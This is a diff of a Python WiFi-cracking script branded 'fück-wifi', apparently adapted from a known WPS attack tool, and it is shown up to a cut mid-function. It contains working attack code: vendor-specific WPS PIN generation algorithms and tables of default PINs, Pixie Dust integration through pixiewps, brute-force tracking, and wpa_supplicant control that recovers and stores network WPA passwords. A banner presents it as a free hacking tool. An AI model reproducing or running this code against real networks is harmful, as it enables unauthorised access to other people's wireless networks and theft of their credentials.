+\033[1;31m(_))_|_ ((_) )\___ |_ ((_)  (_))    ((_)((_)((_)((_)  
+\033[1;33m| |_ | | | |((/ __|| |/ /   | |    / _ \\  \ / / | __| 
+\033[1;32m| __|| |_| | | (__   ' <    | |__ | (_) |\ V /  | _|  
+\033[1;33m|_|   \___/   \___| _|\_\   |____| \___/  \_/   |___| 
+                                                      
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;33m<============== CREATED BY TANVIR HASAN =============>
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
+\033[1;32m[+] \033[1;33mOwner  : Tanvir Hasan
+\033[1;32m[+] \033[1;33mFacebook: www.facebook.com/tanvirhasan444
+\033[1;32m[+] \033[1;33mGithub  : https://www.github.com/tanvirhasan999
+\033[1;32m[+] \033[1;33mVersion : 1.1
+\033[1;32m[+] \033[1;33mTool  : Free ❤️
+\033[1;32m[+] \033[1;33mTelegram : https://t.me/tanvir2651
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
+\033[1;32m[+]\033[1;33m Network marks: \033[1;32mHack Possible \033[1;33m| \033[1;31mWPS locked \033[1;33m| \033[1;37m10% 
+chance will be hack
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
+""")
+print(logo)
+print("Run tool agin Command:\nsudo python Wifi-Hack/fück-wifi.py -i wlan0 -K\nNeed Help? Type:\npython Wifi-Hack/fück-wifi.py --help\033[0m")
+class NetworkAddress:
+    def __init__(self, mac):
+        if isinstance(mac, int):
+            self._int_repr = mac
+            self._str_repr = self._int2mac(mac)
+        elif isinstance(mac, str):
+            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
+            self._int_repr = self._mac2int(mac)
+        else:
+            raise ValueError('MAC address must be string or integer')
+
+    @property
+    def string(self):
+        return self._str_repr
+
+    @string.setter
+    def string(self, value):
+        self._str_repr = value
+        self._int_repr = self._mac2int(value)
+
+    @property
+    def integer(self):
+        return self._int_repr
+
+    @integer.setter
+    def integer(self, value):
+        self._int_repr = value
+        self._str_repr = self._int2mac(value)
+
+    def __int__(self):
+        return self.integer
+
+    def __str__(self):
+        return self.string
+
+    def __iadd__(self, other):
+        self.integer += other
+
+    def __isub__(self, other):
+        self.integer -= other
+
+    def __eq__(self, other):
+        return self.integer == other.integer
+
+    def __ne__(self, other):
+        return self.integer != other.integer
+
+    def __lt__(self, other):
+        return self.integer < other.integer
+
+    def __gt__(self, other):
+        return self.integer > other.integer
+
+    @staticmethod
+    def _mac2int(mac):
+        return int(mac.replace(':', ''), 16)
+
+    @staticmethod
+    def _int2mac(mac):
+        mac = hex(mac).split('x')[-1].upper()
+        mac = mac.zfill(12)
+        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
+        return mac
+
+    def __repr__(self):
+        return 'NetworkAddress(string={}, integer={})'.format(
+            self._str_repr, self._int_repr)
+
+
+class WPSpin:
+    """WPS pin generator"""
+    def __init__(self):
+        self.ALGO_MAC = 0
+        self.ALGO_EMPTY = 1
+        self.ALGO_STATIC = 2
+
+        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
+                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
+                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
+                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
+                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
+                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
+                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
+                      # Static pin algos
+                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
+                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
+                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
+                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
+                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
+                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
+                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
+                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
+                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
+                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
+                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
+                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
+                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
+                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
+                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
+                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
+                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
+                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
+
+    @staticmethod
+    def checksum(pin):
+        """
+        Standard WPS checksum algorithm.
+        @pin — A 7 digit pin to calculate the checksum for.
+        Returns the checksum value.
+        """
+        accum = 0
+        while pin:
+            accum += (3 * (pin % 10))
+            pin = int(pin / 10)
+            accum += (pin % 10)
+            pin = int(pin / 10)
+        return (10 - accum % 10) % 10
+
+    def generate(self, algo, mac):
+        """
+        WPS pin generator
+        @algo — the WPS pin algorithm ID
+        Returns the WPS pin string value
+        """
+        mac = NetworkAddress(mac)
+        if algo not in self.algos:
+            raise ValueError('Invalid WPS pin algorithm')
+        pin = self.algos[algo]['gen'](mac)
+        if algo == 'pinEmpty':
+            return pin
+        pin = pin % 10000000
+        pin = str(pin) + str(self.checksum(pin))
+        return pin.zfill(8)
+
+    def getAll(self, mac, get_static=True):
+        """
+        Get all WPS pin's for single MAC
+        """
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC and not get_static:
+                continue
+            item = {}
+            item['id'] = ID
+            if algo['mode'] == self.ALGO_STATIC:
+                item['name'] = 'Static PIN — ' + algo['name']
+            else:
+                item['name'] = algo['name']
+            item['pin'] = self.generate(ID, mac)
+            res.append(item)
+        return res
+
+    def getList(self, mac, get_static=True):
+        """
+        Get all WPS pin's for single MAC as list
+        """
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC and not get_static:
+                continue
+            res.append(self.generate(ID, mac))
+        return res
+
+    def getSuggested(self, mac):
+        """
+        Get all suggested WPS pin's for single MAC
+        """
+        algos = self._suggest(mac)
+        res = []
+        for ID in algos:
+            algo = self.algos[ID]
+            item = {}
+            item['id'] = ID
+            if algo['mode'] == self.ALGO_STATIC:
+                item['name'] = 'Static PIN — ' + algo['name']
+            else:
+                item['name'] = algo['name']
+            item['pin'] = self.generate(ID, mac)
+            res.append(item)
+        return res
+
+    def getSuggestedList(self, mac):
+        """
+        Get all suggested WPS pin's for single MAC as list
+        """
+        algos = self._suggest(mac)
+        res = []
+        for algo in algos:
+            res.append(self.generate(algo, mac))
+        return res
+
+    def getLikely(self, mac):
+        res = self.getSuggestedList(mac)
+        if res:
+            return res[0]
+        else:
+            return None
+
+    def _suggest(self, mac):
+        """
+        Get algos suggestions for single MAC
+        Returns the algo ID
+        """
+        mac = mac.replace(':', '').upper()
+        algorithms = {
+            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
+            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
+            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
+            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
+            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
+            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
+            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
+            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
+            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
+            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
+            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
+            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
+            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
+            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
+            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
+            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
+            'pinRealtek2': ('007263', 'E4BEED'),
+            'pinRealtek3': ('08C6B3',),
+            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
+            'pinUR814AC': ('D4BF7F60',),
+            'pinUR825AC': ('D4BF7F5',),
+            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
+            'pinEdimax': ('801F02', '00E04C'),
+            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
+            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
+            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
+            'pinONO': ('5C353B', 'DC537C')
+        }
+        res = []
+        for algo_id, masks in algorithms.items():
+            if mac.startswith(masks):
+                res.append(algo_id)
+        return res
+
+    def pin24(self, mac):
+        return mac.integer & 0xFFFFFF
+
+    def pin28(self, mac):
+        return mac.integer & 0xFFFFFFF
+
+    def pin32(self, mac):
+        return mac.integer % 0x100000000
+
+    def pinDLink(self, mac):
+        # Get the NIC part
+        nic = mac.integer & 0xFFFFFF
+        # Calculating pin
+        pin = nic ^ 0x55AA55
+        pin ^= (((pin & 0xF) << 4) +
+                ((pin & 0xF) << 8) +
+                ((pin & 0xF) << 12) +
+                ((pin & 0xF) << 16) +
+                ((pin & 0xF) << 20))
+        pin %= int(10e6)
+        if pin < int(10e5):
+            pin += ((pin % 9) * int(10e5)) + int(10e5)
+        return pin
+
+    def pinDLink1(self, mac):
+        mac.integer += 1
+        return self.pinDLink(mac)
+
+    def pinASUS(self, mac):
+        b = [int(i, 16) for i in mac.string.split(':')]
+        pin = ''
+        for i in range(7):
+            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
+        return int(pin)
+
+    def pinAirocon(self, mac):
+        b = [int(i, 16) for i in mac.string.split(':')]
+        pin = ((b[0] + b[1]) % 10)\
+        + (((b[5] + b[0]) % 10) * 10)\
+        + (((b[4] + b[5]) % 10) * 100)\
+        + (((b[3] + b[4]) % 10) * 1000)\
+        + (((b[2] + b[3]) % 10) * 10000)\
+        + (((b[1] + b[2]) % 10) * 100000)\
+        + (((b[0] + b[1]) % 10) * 1000000)
+        return pin
+
+
+def recvuntil(pipe, what):
+    s = ''
+    while True:
+        inp = pipe.stdout.read(1)
+        if inp == '':
+            return s
+        s += inp
+        if what in s:
+            return s
+
+
+def get_hex(line):
+    a = line.split(':', 3)
+    return a[2].replace(' ', '').upper()
+
+
+class PixiewpsData:
+    def __init__(self):
+        self.pke = ''
+        self.pkr = ''
+        self.e_hash1 = ''
+        self.e_hash2 = ''
+        self.authkey = ''
+        self.e_nonce = ''
+
+    def clear(self):
+        self.__init__()
+
+    def got_all(self):
+        return (self.pke and self.pkr and self.e_nonce and self.authkey
+                and self.e_hash1 and self.e_hash2)
+
+    def get_pixie_cmd(self, full_range=False):
+        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
+                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
+                    self.pke, self.pkr, self.e_hash1,
+                    self.e_hash2, self.authkey, self.e_nonce)
+        if full_range:
+            pixiecmd += ' --force'
+        return pixiecmd
+
+
+class ConnectionStatus:
+    def __init__(self):
+        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.last_m_message = 0
+        self.essid = ''
+        self.wpa_psk = ''
+
+    def isFirstHalfValid(self):
+        return self.last_m_message > 5
+
+    def clear(self):
+        self.__init__()
+
+
+class BruteforceStatus:
+    def __init__(self):
+        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        self.mask = ''
+        self.last_attempt_time = time.time()   # Last PIN attempt start time
+        self.attempts_times = collections.deque(maxlen=15)
+
+        self.counter = 0
+        self.statistics_period = 5
+
+    def display_status(self):
+        average_pin_time = statistics.mean(self.attempts_times)
+        if len(self.mask) == 4:
+            percentage = int(self.mask) / 11000 * 100
+        else:
+            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
+        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
+            percentage, self.start_time, average_pin_time))
+
+    def registerAttempt(self, mask):
+        self.mask = mask
+        self.counter += 1
+        current_time = time.time()
+        self.attempts_times.append(current_time - self.last_attempt_time)
+        self.last_attempt_time = current_time
+        if self.counter == self.statistics_period:
+            self.counter = 0
+            self.display_status()
+
+    def clear(self):
+        self.__init__()
+
+
+class Companion:
+    """Main application part"""
+    def __init__(self, interface, save_result=False, print_debug=False):
+        self.interface = interface
+        self.save_result = save_result
+        self.print_debug = print_debug
+
+        self.tempdir = tempfile.mkdtemp()
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
+            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
+            self.tempconf = temp.name
+        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
+        self.__init_wpa_supplicant()
+
+        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
+        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+        self.retsock.bind(self.res_socket_file)
+
+        self.pixie_creds = PixiewpsData()
+        self.connection_status = ConnectionStatus()
+
+        user_home = str(pathlib.Path.home())
+        self.sessions_dir = f'{user_home}/.BiRi/sessions/'
+        self.pixiewps_dir = f'{user_home}/.BiRi/pixiewps/'
+        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+        if not os.path.exists(self.sessions_dir):
+            os.makedirs(self.sessions_dir)
+        if not os.path.exists(self.pixiewps_dir):
+            os.makedirs(self.pixiewps_dir)
+
+        self.generator = WPSpin()
+
+    def __init_wpa_supplicant(self):
+        print('[*] Running wpa_supplicant…')
+        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
+        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        # Waiting for wpa_supplicant control interface initialization
+        while not os.path.exists(self.wpas_ctrl_path):
+            pass
+
+    def sendOnly(self, command):
+        """Sends command to wpa_supplicant"""
+        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
+
+    def sendAndReceive(self, command):
+        """Sends command to wpa_supplicant and returns the reply"""
+        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
+        (b, address) = self.retsock.recvfrom(4096)
+        inmsg = b.decode('utf-8', errors='replace')
+        return inmsg
+
+    def __handle_wpas(self, pixiemode=False, verbose=None):
+        if not verbose:
+            verbose = self.print_debug
+        line = self.wpas.stdout.readline()
+        if not line:
+            self.wpas.wait()
+            return False
+        line = line.rstrip('\n')
+
+        if verbose:
+            sys.stderr.write(line + '\n')
+
+        if line.startswith('WPS: '):
+            if 'Building Message M' in line:
+                n = int(line.split('Building Message M')[1].replace('D', ''))
+                self.connection_status.last_m_message = n
+                print('[*] Sending WPS Message M{}…'.format(n))
+            elif 'Received M' in line:
+                n = int(line.split('Received M')[1])
+                self.connection_status.last_m_message = n
+                print('[*] Received WPS Message M{}'.format(n))
+                if n == 5:
+                    print('[+] The first half of the PIN is valid')
+            elif 'Received WSC_NACK' in line:
+                self.connection_status.status = 'WSC_NACK'
+                print('[*] Received WSC NACK')
+                print('[-] Error: wrong PIN code')
+            elif 'Enrollee Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.e_nonce = get_hex(line)
+                assert(len(self.pixie_creds.e_nonce) == 16*2)
+                if pixiemode:
+                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+            elif 'DH own Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pkr = get_hex(line)
+                assert(len(self.pixie_creds.pkr) == 192*2)
+                if pixiemode:
+                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
+            elif 'DH peer Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pke = get_hex(line)
+                assert(len(self.pixie_creds.pke) == 192*2)
+                if pixiemode:
+                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
+            elif 'AuthKey' in line and 'hexdump' in line:
+                self.pixie_creds.authkey = get_hex(line)
+                assert(len(self.pixie_creds.authkey) == 32*2)
+                if pixiemode:
+                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
+            elif 'E-Hash1' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash1 = get_hex(line)
+                assert(len(self.pixie_creds.e_hash1) == 32*2)
+                if pixiemode:
+                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
+            elif 'E-Hash2' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash2 = get_hex(line)
+                assert(len(self.pixie_creds.e_hash2) == 32*2)
+                if pixiemode:
+                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
+            elif 'Network Key' in line and 'hexdump' in line:
+                self.connection_status.status = 'GOT_PSK'
+                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
+        elif ': State: ' in line:
+            if '-> SCANNING' in line:
+                self.connection_status.status = 'scanning'
+                print('[*] Scanning…')
+        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
+            self.connection_status.status = 'WPS_FAIL'
+            print('[-] wpa_supplicant returned WPS-FAIL')
+#        elif 'NL80211_CMD_DEL_STATION' in line:
+#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+        elif 'Trying to authenticate with' in line:
+            self.connection_status.status = 'authenticating'
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print('[*] Authenticating…')
+        elif 'Authentication response' in line:
+            print('[+] Authenticated')
+        elif 'Trying to associate with' in line:
+            self.connection_status.status = 'associating'
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print('[*] Associating with AP…')
+        elif ('Associated with' in line) and (self.interface in line):
+            bssid = line.split()[-1].upper()
+            if self.connection_status.essid:
+                print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
+            else:
+                print('[+] Associated with {}'.format(bssid))
+        elif 'EAPOL: txStart' in line:
+            self.connection_status.status = 'eapol_start'
+            print('[*] Sending EAPOL Start…')
+        elif 'EAP entering state IDENTITY' in line:
+            print('[*] Received Identity Request')
+        elif 'using real identity' in line:
+            print('[*] Sending Identity Response…')
+
+        return True
+
+    def __runPixiewps(self, showcmd=False, full_range=False):
+        print("[*] Running Pixiewps…")
+        cmd = self.pixie_creds.get_pixie_cmd(full_range)
+        if showcmd:
+            print(cmd)
+        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                           stderr=sys.stdout, encoding='utf-8', errors='replace')
+        print(r.stdout)
+        if r.returncode == 0:
+            lines = r.stdout.splitlines()
+            for line in lines:
+                if ('[+]' in line) and ('WPS pin' in line):
+                    pin = line.split(':')[-1].strip()
+                    if pin == '<empty>':
+                        pin = "''"
+                    return pin
+        return False
+
+    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
+        print(f"[+] WPS PIN: {wps_pin}")
+        print(f"[+] Password: {wpa_psk}")
+        print(f"[+] AP SSID: '{essid}'")
+
+    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
+        if not os.path.exists(self.reports_dir):
+            os.makedirs(self.reports_dir)
+        filename = self.reports_dir + 'stored'
+        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
+        with open(filename + '.txt', 'a', encoding='utf-8') as file:
+            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
+                        dateStr, bssid, essid, wps_pin, wpa_psk
+                    )
+            )
+        writeTableHeader = not os.path.isfile(filename + '.csv')
+        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
+            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
+            if writeTableHeader:
+                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
+            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
+        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+
+    def __savePin(self, bssid, pin):
+        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+        with open(filename, 'w') as file:
+            file.write(pin)
+        print('[i] PIN saved in {}'.format(filename))
+
+    def __prompt_wpspin(self, bssid):
+        pins = self.generator.getSuggested(bssid)
+        if len(pins) > 1:
+            print(f'PINs generated for {bssid}:')
+            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
+            for i, pin in enumerate(pins):
+                number = '{})'.format(i + 1)
+                line = '{:<3} {:<10} {:<}'.format(
+                    number, pin['pin'], pin['name'])
+                print(line)
+            while 1:
+                pinNo = input('Select the PIN: ')
+                try:
+                    if int(pinNo) in range(1, len(pins)+1):
+                        pin = pins[int(pinNo) - 1]['pin']
+                    else:
+                        raise IndexError
+                except Exception:
+                    print('Invalid number')
+                else:
+                    break
+        elif len(pins) == 1:
+            pin = pins[0]
+            print('[i] The only probable PIN is selected:', pin['name'])
+            pin = pin['pin']
+        else:
+            return None
+        return pin
+
+    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
+        if not verbose:
+            verbose = self.print_debug
+        self.pixie_creds.clear()
+        self.connection_status.clear()
+        self.wpas.stdout.read(300)   # Clean the pipe
+        print(f"[*] Trying PIN '{pin}'…")
+        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
+        if 'OK' not in r:
+            self.connection_status.status = 'WPS_FAIL'
+            if r == 'UNKNOWN COMMAND':
+                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
+                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
+            else:
+                print('[!] Something went wrong — check out debug log')
+            return False
+
+        while True:
+            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
+            if not res:
+                break
+            if self.connection_status.status == 'WSC_NACK':
+                break
